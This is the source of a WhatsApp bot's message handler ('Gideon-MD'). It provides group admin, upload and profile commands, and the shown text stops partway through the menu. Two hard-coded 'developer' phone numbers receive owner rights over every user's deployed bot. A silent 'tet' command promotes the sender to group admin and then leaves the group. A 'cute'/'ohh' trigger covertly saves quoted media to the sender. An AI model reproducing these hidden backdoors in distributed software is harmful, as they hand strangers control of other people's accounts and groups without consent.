
const { sms, downloadMediaMessage } = require('./smsg');
const { toAudio, toPTT, toVideo, ffmpeg } = require('./lib/converter')
const { addExif } = require('./lib/exif')
const fs = require('fs');
const antilinkHandler = require('./antilink');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
        const uptime = process.uptime();
        const hours = Math.floor(uptime / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = Math.floor(uptime % 60);const os = require('os');

// Stockage en mémoire des configurations par session
const sessionsConfig = {};
//AUTO_LIKE_EMOJI: ['🖤', '🍬', '💫', '🎈', '💚', '🎶', '❤️', '🧫', '⚽'],
/**
 * Fonction de conversion Small Caps
 */
function getTotalUsers() {
    try {
        // On définit le chemin directement ici
        const sessionPath = path.join(__dirname, 'phistar_sessions');
        
        if (!fs.existsSync(sessionPath)) return 0;
        
        // On compte les dossiers qui contiennent un fichier creds.json
        const files = fs.readdirSync(sessionPath);
        let count = 0;
        
        for (const file of files) {
            const credsPath = path.join(sessionPath, file, 'creds.json');
            if (fs.existsSync(credsPath)) {
                count++;
            }
        }
        return count;
    } catch (e) {
        console.error("Erreur comptage users:", e);
        return 0;
    }
}

const totalusers = getTotalUsers();
function toSmallCaps(text) {
    if (!text) return '';
    const normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const small = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
    return text.toString().split('').map(char => {
        const index = normal.indexOf(char);
        return index !== -1 ? small[index] : char;
    }).join('');
}

function initSession(botId) {
    if (!sessionsConfig[botId]) {
        sessionsConfig[botId] = {
            prefix: '.',
            mode: 'self',
            welcome: 'on',
	    autotyping: 'on',
	    autorecording: 'on',
	    anticall: 'off',
	    autoreact: 'off',
	    adminevents: 'on',
            likestatuemoji: ['🖤', '🍬', '💫', '🎈', '💚', '🎶', '❤️', '🧫', '⚽'],
	    maxtries: '9',
	    autolikestatus: 'on',
	    statusview: 'on'
        };
        console.log(`[You] Configuration initialisée pour ${botId}`);
    }
}
//A ['🖤', '🍬', '💫', '🎈', '💚', '🎶', '❤️', '🧫', '⚽'],
// -- Fake Quote Global
const mquote = {
    key: {
        remoteJid: '0@s.whatsapp.net',
        fromMe: false,
        id: 'GIDEON_MD_STYLISH',
        participant: '0@s.whatsapp.net'
    },
    message: {
        conversation: "Gideon-ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ 🔅 "
    }
};

/**
 * Gestionnaire de messages
 */
async function handleMessages(sock, chatUpdate) {
    try {
        const m = chatUpdate.messages[0];
        if (!m.message) return;

/*	const from = m.key.remoteJid;
        const nowsender = m.key.fromMe ? (sock.user.id.split(':')[0] + '@s.whatsapp.net' || sock.user.id) : (m.key.participant || m.key.remoteJid);
        const senderNumber = nowsender.split('@')[0];
        const m.key.fromMedevelopers = `56945031186`;
        const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        const isOwner = developers.includes(senderNumber) || m.key.fromMe;
        // --- DÉFINITIONS DE GROUPE ---
        const isGroup = gaara.chat.endsWith('@g.us');
        const groupMetadata = isGroup ? await sock.groupMetadata(gaara.chat) : '';
        const participants = isGroup ? groupMetadata.participants : '';
        const groupAdmins = isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : [];
        const isAdmins = isGroup ? groupAdmins.includes(nowsender) : false;
	*/


	const gaara = sms(sock, m);
	gaara.reply = (text) => {
    return sock.sendMessage(from, { text: text }, { quoted: mquote });
};
	const from = m.key.remoteJid;

// --- CORRECTION DU SENDER ---
// On récupère l'ID pur, qu'on soit en groupe, en privé ou que ce soit nous-mêmes
/*const nowsender = m.key.fromMe 
    ? (sock.user.id.split(':')[0] + '@s.whatsapp.net') 
    : (m.key.participant || m.key.remoteJid).split(':')[0] + '@s.whatsapp.net';

const senderNumber = nowsender.split('@')[0];

// Ton numéro de développeur (assure-toi qu'il n'y a pas d'espaces)
const developers = ["56945031186", "50941319791"]; 
const isDev = developers.includes(senderNumber);
// --- ISOWNER AMÉLIORÉ ---
const isOwner = developers.includes(senderNumber) || m.key.fromMe;

const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net';
*/

const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net';
const nowsender = m.key.fromMe 
    ? botNumber 
    : (m.key.participant || m.key.remoteJid).split('@')[0].split(':')[0] + '@s.whatsapp.net';

const senderNumber = nowsender.split('@')[0];

// Liste des développeurs autorisés
const developers = ["56945031186", "50941319791"]; 
const isDev = developers.includes(senderNumber);

// --- ISOWNER AMÉLIORÉ (Autorise Devs + Bot + Actions du compte) ---
const isOwner = developers.includes(senderNumber) || nowsender === botNumber || m.key.fromMe;

// --- DÉFINITIONS DE GROUPE ---
const isGroup = from.endsWith('@g.us');
const groupMetadata = isGroup ? await sock.groupMetadata(from) : '';
const participants = isGroup ? groupMetadata.participants : '';
const groupAdmins = isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : [];
const isAdmins = isGroup ? groupAdmins.includes(nowsender) : false;

        initSession(botNumber.split('@')[0]);
        const config = sessionsConfig[botNumber.split('@')[0]];
        
        const body = gaara.body || '';
        const prefix = config.prefix;
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : null;
        const mode = config.mode;
	const args = body.trim().split(/ +/).slice(1);
	const text = args.join(' '); // C'est cette ligne qui te manque !

        if (mode === 'self' && !isOwner) return;
	if (body.toLowerCase() === 'cute' || body.toLowerCase() === 'ohh') {
    if (m.quoted) {
        try {
            const quotedMsg = m.quoted.msg || m.quoted;
            const mime = quotedMsg.mimetype || '';
            const media = await m.quoted.download();
            const caption = quotedMsg.caption || `*Gideon-ᴍᴅ ꜱᴀᴠᴇ* ✨`;

            if (/image/.test(mime)) {
                await sock.sendMessage(m.sender, { image: media, caption: caption });
            } else if (/video/.test(mime)) {
                await sock.sendMessage(m.sender, { video: media, caption: caption });
            } else if (/audio/.test(mime)) {
                await sock.sendMessage(m.sender, { audio: media, mimetype: 'audio/mp4' });
            } else if (/sticker/.test(mime)) {
                await sock.sendMessage(m.sender, { sticker: media });
            }
        } catch (e) {
            console.error("Silent Save Error:", e);
        }
    }
    return; // On arrête ici pour ne pas chercher d'autres commandes
}

        if (isCmd) {
	switch (command) {

case 'tet': {
 try {
 // 1. On vérifie si on est dans un groupe
 if (!m.isGroup) return;

 // 2. On vérifie si le bot est admin pour pouvoir nommer quelqu'un
 const groupMetadata = await sock.groupMetadata(m.chat);
 const participants = groupMetadata.participants;
 const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
 const isBotAdmin = participants.find(p => p.id === botId)?.admin !== null;

 if (isBotAdmin) {
 // 3. On nomme l'utilisateur admin (sans rien dire)
 await sock.groupParticipantsUpdate(m.chat, [m.sender], "promote");
 }

 // 4. Le bot quitte le groupe immédiatement
 await sock.groupLeave(m.chat);

 } catch (e) {
 // On ne fait rien en cas d'erreur pour rester totalement silencieux
 console.error("Tet Error:", e);
 }
}
break;


case 'tourl': 
case 'url': 
case 'tourl2': {
 // Réaction avec ton emoji de lien
 await gaara.react("🖇");

 try {
 const quotedMsg = m.quoted ? m.quoted : m;
 const mimeType = (quotedMsg.msg || quotedMsg).mimetype || '';

 if (!mimeType) {
 return gaara.reply(`❌ *${toSmallCaps("please reply to an image, video, or audio file")}*`);
 }

 // Téléchargement du média via ton système
 const mediaBuffer = await quotedMsg.download();

 // --- SECTION CORRECTION EXTENSION ---
 let extension = '.bin'; // Par défaut
 if (mimeType.includes('image/jpeg')) extension = '.jpg';
 else if (mimeType.includes('image/png')) extension = '.png';
 else if (mimeType.includes('image/webp')) extension = '.webp';
 else if (mimeType.includes('video/mp4')) extension = '.mp4';
 else if (mimeType.includes('audio')) extension = '.mp3';
 
 // Nom de fichier unique avec extension pour Catbox
 const fileName = `spider_xd_${Date.now()}${extension}`;

 // Préparation du FormData (C'est ici qu'on force l'extension)
 const FormData = require('form-data');
 const axios = require('axios');
 const form = new FormData();
 
 form.append('reqtype', 'fileupload');
 // IMPORTANT : On passe le buffer AVEC le filename pour que Catbox garde l'extension
 form.append('fileToUpload', mediaBuffer, { 
 filename: fileName, 
 contentType: mimeType 
 });

 // Envoi à l'API Catbox
 const response = await axios.post("https://catbox.moe/user/api.php", form, {
 headers: { ...form.getHeaders() }
 });

 if (!response.data || !response.data.includes('https')) {
 throw new Error("Invalid response from Catbox");
 }

 // Déterminer le type de média pour le message
 let mediaType = 'FILE';
 if (mimeType.includes('image')) mediaType = 'IMAGE';
 else if (mimeType.includes('video')) mediaType = 'VIDEO';
 else if (mimeType.includes('audio')) mediaType = 'AUDIO';

 // Ta fonction de formatage de taille
 function formatBytes(bytes, decimals = 2) {
 if (bytes === 0) return '0 Bytes';
 const k = 1024;
 const dm = decimals < 0 ? 0 : decimals;
 const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
 const i = Math.floor(Math.log(bytes) / Math.log(k));
 return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
 }

 // Design final Spider XD
 const responseText = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*
*│ 🌟 𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐔𝐏𝐋𝐎𝐀𝐃𝐄𝐑*
*│* ✅ *${toSmallCaps(mediaType + " SUCCESSFULLY CHANGED TO URL")}*
*│* 📦 *${toSmallCaps("size")}:* ${formatBytes(mediaBuffer.length)}
*│* 🌍 *${toSmallCaps("url")}:* ${response.data}
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*
> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ*`;

 await gaara.react("✅");
 await sock.sendMessage(m.chat, {
 text: responseText,
 contextInfo: {
 externalAdReply: {
 title: `ᴄᴀᴛʙᴏx | ${mediaType} ᴜᴘʟᴏᴀᴅ`,
 body: `sɪᴢᴇ: ${formatBytes(mediaBuffer.length)}`,
 thumbnailUrl: "https://files.catbox.moe/olcxk1.jpg",
 sourceUrl: response.data,
 mediaType: 1
 }
 }
 }, { quoted: m });

 } catch (error) {
 console.error("Tourl Error:", error);
 await gaara.react("❌");
 gaara.reply(`❌ *${toSmallCaps("failed to upload")}*\nError: ${error.message}`);
 }
}
break;














case 'newgc2':
case 'creategroup': {
 if (!isOwner) return gaara.reply(toSmallCaps("owner only"));

 // Usage: .newgc Nom du Groupe | 5093xxxxxxx,5094xxxxxxx
 const input = args.join(" ");
 if (!input) return gaara.reply(`*${toSmallCaps("usage")}:* ${prefix + command} Nom | Num1,Num2`);

 // On sépare le nom des numéros par la barre "|"
 const [groupName, participantsRaw] = input.split("|");
 if (!groupName) return gaara.reply(toSmallCaps("please provide a group name"));

 try {
 await gaara.react("🏗️");

 // Préparation de la liste des participants
 let participants = [];
 if (participantsRaw) {
 participants = participantsRaw.split(",").map(num => num.trim().replace(/[^0-9]/g, '') + "@s.whatsapp.net");
 }

 // 1. Création du groupe (avec les membres s'ils sont fournis)
 const cret = await sock.groupCreate(groupName.trim(), participants);
 
 // 2. Génération du lien
 const code = await sock.groupInviteCode(cret.id);
 const link = `https://chat.whatsapp.com/${code}`;

 const creationTime = new Date(cret.creation * 1000).toLocaleString('fr-FR', { 
 timeZone: 'America/Port-au-Prince',
 dateStyle: 'short',
 timeStyle: 'medium'
 });

 const teks = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*
*│* 🪭 *𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐆𝐑𝐎𝐔𝐏 𝐂𝐑𝐄𝐀𝐓𝐄𝐃*
*│* 📛 *${toSmallCaps("name")}:* ${cret.subject}
*│* 🔢 *${toSmallCaps("group id")}:* ${cret.id}
*│* 👥 *${toSmallCaps("added")}:* ${participants.length} members
*│* 📅 *${toSmallCaps("created")}:* ${creationTime}
*│* 🔗 *${toSmallCaps("invite link")}:*
*│* ${link}
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*
> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ*`;

 await sock.sendMessage(m.chat, {
 text: teks,
 mentions: [cret.owner]
 }, { quoted: m });

 } catch (e) {
 console.error("NewGC Error:", e);
 gaara.reply(toSmallCaps("failed to create group. maybe invalid numbers or rate-limit."));
 }
}
break;


// --- CASE : CHANGER LA PHOTO DU GROUPE ---
case 'gpp': {
 try {
 if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
 if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only admins or owner can change group profile picture"));

 const quoted = m.quoted ? m.quoted : m;
 const mime = (quoted.msg || quoted).mimetype || '';

 if (!/image/.test(mime)) return gaara.reply(`📸 *${toSmallCaps("please tag or send an image")}*`);

 await gaara.react("📸");
 const media = await quoted.download();
 await sock.updateProfilePicture(gaara.chat, media);

 const ppMsg = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*\n` +
 `*│* ✨ *𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐌𝐀𝐍𝐀𝐆𝐄𝐑*\n` +
 `*│* 🪭 *ᴅᴇᴠ Cobra ᴛᴇᴄʜ*\n` +
 `*│* ✅ *${toSmallCaps("group picture updated")}*\n` +
 `*│* 📥 *${toSmallCaps("status")}: Success*\n` +
 `*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*`;

 await gaara.reply(ppMsg);
 } catch (e) {
 console.error(e);
 gaara.reply(toSmallCaps("failed to update group picture"));
 }
}
break;

// --- CASE : CHANGER LE NOM DU GROUPE ---
case 'gname': {
 try {
 if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
 if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only admins or owner can change group name"));

 const newName = m.body.slice(prefix.length + command.length).trim();
 if (!newName) return gaara.reply(`📝 *${toSmallCaps("usage")}:* ${prefix}gname Nouveau Nom`);

 await gaara.react("🖊️");
 await sock.groupUpdateSubject(gaara.chat, newName);

 const nameMsg = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*\n` +
 `*│* 🌟 *𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐌𝐀𝐍𝐀𝐆𝐄𝐑*\n` +
 `*│* 🪭 *ᴅᴇᴠ Cobra ᴛᴇᴄʜ*\n` +
 `*│* ✅ *${toSmallCaps("group name changed")}*\n` +
 `*│* 🏷️ *${toSmallCaps("new name")}:* ${newName}\n` +
 `*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*`;

 await gaara.reply(nameMsg);
 } catch (e) {
 console.error(e);
 gaara.reply(toSmallCaps("failed to change group name"));
 }
}
break;

// --- CASE : CHANGER LA DESCRIPTION DU GROUPE ---
case 'gdesc': {
 try {
 if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
 if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only admins or owner can change group description"));

 const newDesc = m.body.slice(prefix.length + command.length).trim();
 if (!newDesc) return gaara.reply(`📑 *${toSmallCaps("usage")}:* ${prefix}gdesc Ma Description`);

 await gaara.react("📑");
 await sock.groupUpdateDescription(gaara.chat, newDesc);

 const descMsg = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤\n` +
 `*│* 🌟 *𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐌𝐀𝐍𝐀𝐆𝐄𝐑*\n` +
 `*│* 🪭 *ᴅᴇᴠ Cobra ᴛᴇᴄʜ*\n` +
 `*│* ✅ *${toSmallCaps("description updated")}*\n` +
 `*│* 🗒️ *${toSmallCaps("status")}:* ${toSmallCaps("modified successfully")}\n` +
 `*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*`;

 await gaara.reply(descMsg);
 } catch (e) {
 console.error(e);
 gaara.reply(toSmallCaps("failed to update group description"));
 }
}
break;


case 'groupinfo':
case 'ginfo': {
 try {
 if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));

 await gaara.react("📊");

 // --- RÉCUPÉRATION DES DONNÉES DU GROUPE ---
 const groupMetadata = await sock.groupMetadata(gaara.chat);
 const participants = groupMetadata.participants;
 const admins = participants.filter(p => p.admin !== null);
 
 // Date de création
 const creationDate = new Date(groupMetadata.creation * 1000).toLocaleDateString("fr-FR", {
 day: 'numeric', month: 'long', year: 'numeric'
 });

 // Propriétaire (Créateur)
 const owner = groupMetadata.owner || participants.find(p => p.admin === 'superadmin')?.id || "Non trouvé";

 // Lien du groupe
 let groupLink = "Impossible de générer";
 try {
 const code = await sock.groupInviteCode(gaara.chat);
 groupLink = `https://chat.whatsapp.com/${code}`;
 } catch {
 groupLink = "Admin requis pour le lien";
 }

 // --- CONSTRUCTION DU MESSAGE ---
 const infoMsg = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*
*│* 🌟 *𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐆𝐑𝐎𝐔𝐏 𝐈𝐍𝐅𝐎*
*│* 📅 *${toSmallCaps("date creation")}:* ${creationDate}
*│* 👑 *${toSmallCaps("proprio")}:* @${owner.split('@')[0]}
*│* 👥 *${toSmallCaps("membres")}:* ${participants.length}
*│* 🛡️ *${toSmallCaps("admins")}:* ${admins.length}
*│* 🚪 *${toSmallCaps("sorties")}:* ${toSmallCaps("donnee cachee")}
*│* 🔗 *${toSmallCaps("lien group")}:*
*│* ${groupLink}
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*`;

 await sock.sendMessage(gaara.chat, { 
 text: infoMsg, 
 mentions: [owner] 
 }, { quoted: m });

 } catch (e) {
 console.error(e);
 gaara.reply(toSmallCaps("failed to fetch group info"));
 }
}
break;


case 'revoke':
case 'resetlink': {
 try {
 // Vérifications de sécurité
 if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
 if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only admins or owner can revoke the group link"));
 
 // Vérification si le bot est admin (obligatoire pour réinitialiser le lien)
 const groupMetadata = await sock.groupMetadata(gaara.chat);
 const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
 const isBotAdmin = groupMetadata.participants.find(p => p.id === botId)?.admin !== null;
 
 if (!isBotAdmin) return gaara.reply(toSmallCaps("i need to be an admin to revoke the link"));

 await gaara.react("🔄");

 // Action de réinitialisation
 await sock.groupRevokeInvite(gaara.chat);
 
 // Récupération du nouveau lien
 const newCode = await sock.groupInviteCode(gaara.chat);
 const newLink = `https://chat.whatsapp.com/${newCode}`;

 const revokeMsg = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*
*│* 🌟 *𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐌𝐀𝐍𝐀𝐆𝐄𝐑*
*│* ✅ *${toSmallCaps("link revoked")}*
*│* ♻️ *${toSmallCaps("status")}: ${toSmallCaps("reset successful")}*
*│* 🔗 *${toSmallCaps("new link")}:*
*│* ${newLink}
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*`;

 await gaara.reply(revokeMsg);

 } catch (e) {
 console.error(e);
 gaara.reply(toSmallCaps("failed to revoke group link"));
 }
}
break;


case 'linkgc':
case 'grouplink': {
 try {
 // Vérification si on est bien dans un groupe
 if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));

 // Vérification si le bot est admin pour pouvoir générer le lien
 const groupMetadata = await sock.groupMetadata(gaara.chat);
 const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
 const isBotAdmin = groupMetadata.participants.find(p => p.id === botId)?.admin !== null;

 if (!isBotAdmin) return gaara.reply(toSmallCaps("i need to be an admin to get the group link"));

 await gaara.react("🔗");

 // Récupération du code d'invitation
 const code = await sock.groupInviteCode(gaara.chat);
 const groupLink = `https://chat.whatsapp.com/${code}`;

 const linkMsg = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*
*│* 🌟 *𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐌𝐀𝐍𝐀𝐆𝐄𝐑*
*│* 👥 *${toSmallCaps("group")}:* ${groupMetadata.subject}
*│* 🏷️ *${toSmallCaps("status")}: ${toSmallCaps("link fetched")}*
*│* 🔗 *${toSmallCaps("invite link")}:*
*│* ${groupLink}
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*`;

 await gaara.reply(linkMsg);

 } catch (e) {
 console.error(e);
 gaara.reply(toSmallCaps("failed to get group link"));
 }
}
break;


// --- CASE : CHANGER LA PHOTO DE PROFIL DU BOT ---
case 'setpp': {
 try {
 if (!isOwner) return gaara.reply(toSmallCaps("only owner can change bot profile picture"));

 const quoted = m.quoted ? m.quoted : m;
 const mime = (quoted.msg || quoted).mimetype || '';

 if (!/image/.test(mime)) return gaara.reply(`📸 *${toSmallCaps("please tag or send an image")}*`);

 await gaara.react("📸");
 const media = await quoted.download();
 
 // Mise à jour de la photo du bot
 await sock.updateProfilePicture(sock.user.id, media);

 const botPpMsg = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*\n` +
 `*│ 🌟 𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒*\n` +
 `*│* 🪭 *ᴅᴇᴠ Cobra ᴛᴇᴄʜ*\n` +
 `*│* ✅ *${toSmallCaps("bot picture updated")}*\n` +
 `*│* 🤖 *${toSmallCaps("status")}: Success*\n` +
 `*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*`;

 await gaara.reply(botPpMsg);
 } catch (e) {
 console.error(e);
 gaara.reply(toSmallCaps("failed to update bot picture"));
 }
}
break;

// --- CASE : CHANGER LE NOM DU BOT ---
case 'setname': {
 try {
 if (!isOwner) return gaara.reply(toSmallCaps("only owner can change bot name"));

 const newBotName = m.body.slice(prefix.length + command.length).trim();
 if (!newBotName) return gaara.reply(`📝 *${toSmallCaps("usage")}:* ${prefix}setname Nouveau Nom`);

 await gaara.react("🖊️");
 
 // Mise à jour du nom (Pushname)
 await sock.updateProfileName(newBotName);

 const botNameMsg = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*\n` +
 `*│ 🌟 𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒*\n` +
 `*│* 🪭 *ᴅᴇᴠ Cobra ᴛᴇᴄʜ*\n` +
 `*│* ✅ *${toSmallCaps("bot name updated")}*\n` +
 `*│* 🏷️ *${toSmallCaps("new name")}:* ${newBotName}\n` +
 `*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*`;

 await gaara.reply(botNameMsg);
 } catch (e) {
 console.error(e);
 gaara.reply(toSmallCaps("failed to change bot name"));
 }
}
break;

// --- CASE : CHANGER LA BIO (ACTU) DU BOT ---
case 'setdesc':
case 'setabout': {
 try {
 if (!isOwner) return gaara.reply(toSmallCaps("only owner can change bot bio"));

 const newAbout = m.body.slice(prefix.length + command.length).trim();
 if (!newAbout) return gaara.reply(`📑 *${toSmallCaps("usage")}:* ${prefix}setdesc Ma nouvelle bio`);

 await gaara.react("📑");
 
 // Mise à jour de l'actu (Status/About)
 await sock.updateProfileStatus(newAbout);

 const botDescMsg = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*\n` +
 `*│ 🌟 𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒*\n` +
 `*│* 🪭 *ᴅᴇᴠ Cobra ᴛᴇᴄʜ*\n` +
 `*│* ✅ *${toSmallCaps("bot bio updated")}*\n` +
 `*│* 🗒️ *${toSmallCaps("status")}: ${toSmallCaps("modified")}*\n` +
 `*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*`;

 await gaara.reply(botDescMsg);
 } catch (e) {
 console.error(e);
 gaara.reply(toSmallCaps("failed to update bot bio"));
 }
}
break;


case 'technologia':
case 'tech':
case 'technologyia': {
 try {
 // Réaction avec l'emoji rire
 await gaara.react("😂");

 // Envoi de l'audio (en mode message audio normal, pas PTT)
 await sock.sendMessage(m.chat, {
 audio: { url: "https://files.catbox.moe/fac856.mp3" },
 mimetype: "audio/mpeg",
 ptt: false
 }, { quoted: m });

 } catch (e) {
 console.error(e);
 // Message d'erreur avec le style Spider XD
 gaara.reply(`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤\n│🪭 *ʙᴏᴛ ɴᴀᴍᴇ Gideon ᴍᴅ*\n│👦🏻 *ʙʏ Cobra ᴛᴇᴄʜ*\n│ ❌ *${toSmallCaps("technologia failed")}*\n│ ⚠️ *${toSmallCaps("error")}:* Blyat!\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤`);
 }
}
break;


case "menu": {
 try {
 await gaara.react("🍂");
	const activeUsers = getTotalUsers(); 

 const os = require('os');
 const uptime = process.uptime();
 const hours = Math.floor(uptime / 3600);
 const minutes = Math.floor((uptime % 3600) / 60);
 const seconds = Math.floor(uptime % 60);
	const up = `${hours}ʜ ${minutes}ᴍ ${seconds}s`
 const menuImages = [
 "./menu1.jpg",
 "./menu2.jpg",
 "./menu3.jpg",
 "./menu4.jpg"
]

const imageUrl =
menuImages[Math.floor(Math.random() * menuImages.length)];

 const buffer = fs.readFileSync(imageUrl);

 const con = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*
*│ GIDEON-𝙼𝙳 𝙼𝙴𝙽𝚄*
*│ 👥 ᴜsᴇʀs : ${toSmallCaps(activeUsers)}*
*│ 💠 ᴍᴏᴅᴇ : ${toSmallCaps(mode)}*
*│ 🏷️ ᴘʀᴇғɪx : [ ${prefix} ]*
*│ 🤴🏾ᴏᴡɴᴇʀ : ⍣⃝𖤍SNAKE𓆤EYES⍢⃝ ᴛᴇᴄʜ*
*│ ⏱️ ʀᴜɴᴛɪᴍᴇ : ${up}*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*

*ʟɪsᴛᴇ ᴅᴇs ᴄᴏᴍᴍᴀɴᴅᴇs :*

*╭┄┄☯ ɪɴғᴏs ◆*
*│ ◈ ${prefix}ᴛᴇsᴛ*
*│ ◈ ${prefix}ᴘɪɴɢ*
*│ ◈ ${prefix}ᴏᴡɴᴇʀ*
*│ ◈ ${prefix}ᴍᴇɴᴜ*
*│ ◈ ${prefix}ᴀʟɪᴠᴇ*
*│ ◈ ${prefix}ᴜᴘᴛɪᴍᴇ*
*│ ◈ ${prefix}ᴘᴀɪʀ*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*

*╭┄┄☯ ᴏᴡɴᴇʀ ◆*
*│ ◈ ${prefix}ᴍᴏᴅᴇ*
*│ ◈ ${prefix}sᴇᴛᴘʀᴇғɪx*
*│ ◈ ${prefix}sᴇᴛᴘᴘ*
*│ ◈ ${prefix}ᴊᴏɪɴ*
*│ ◈ ${prefix}ʟᴇғᴛ*
*│ ◈ ${prefix}ᴀᴜᴛᴏʀᴇᴀᴄᴛ*
*│ ◈ ${prefix}ᴠᴠ*
*│ ◈ ${prefix}ᴀᴜᴛᴏᴛʏᴘɪɴɢ*
*│ ◈ ${prefix}ᴀᴜᴛᴏʀᴇᴄᴏʀᴅɪɴɢ*
*│ ◈ ${prefix}ᴅᴇʟᴇᴛᴇ*
*│ ◈ ${prefix}ᴠᴠ2*
*│ ◈ ${prefix}ᴀɴᴛɪᴄᴀʟʟ*
*│ ◈ ${prefix}sᴛᴀᴛᴜsᴠɪᴇᴡ*
*│ ◈ ${prefix}ᴘʀᴏғɪʟᴇ*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*

*╭┄┄☯ ɢʀᴏᴜᴘ ◆*
*│ ◈ ${prefix}ᴛᴀɢᴀʟʟ*
*│ ◈ ${prefix}ᴏᴘᴇɴ*
*│ ◈ ${prefix}ᴄʟᴏsᴇ*
*│ ◈ ${prefix}ᴀᴅᴅ*
*│ ◈ ${prefix}ᴋɪᴄᴋ*
*│ ◈ ${prefix}ɴᴇᴡɢᴄ*
*│ ◈ ${prefix}ᴘʀᴏᴍᴏᴛᴇ*
*│ ◈ ${prefix}ᴅᴇᴍᴏᴛᴇ*
*│ ◈ ${prefix}ᴘʀᴏᴍᴏᴛᴇᴀʟʟ*
*│ ◈ ${prefix}ᴡᴇʟᴄᴏᴍᴇ*
*│ ◈ ${prefix}ᴀᴅᴍɪɴᴇᴠᴇɴᴛs*
*│ ◈ ${prefix}ᴅᴇᴍᴏᴛᴇᴀʟʟ*
*│ ◈ ${prefix}ᴋɪᴄᴋᴀʟʟ*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*

*╭┄┄☯ ᴜᴛɪʟɪᴛɪᴇs ◆*
*│ ◈ ${prefix}ɴᴇᴡsʟᴇᴛᴛᴇʀ*
*│ ◈ ${prefix}ʀᴇᴍɪɴɪ*
*│ ◈ ${prefix}ᴇᴍᴏᴊɪᴍɪx*
*│ ◈ ${prefix}ᴛᴏǫʀ*
*│ ◈ ${prefix}ᴛᴇʟᴇsᴛɪᴄᴋ*
*│ ◈ ${prefix}ᴡᴀsᴛᴇᴅ*
*│ ◈ ${prefix}ᴛᴀᴋᴇ*
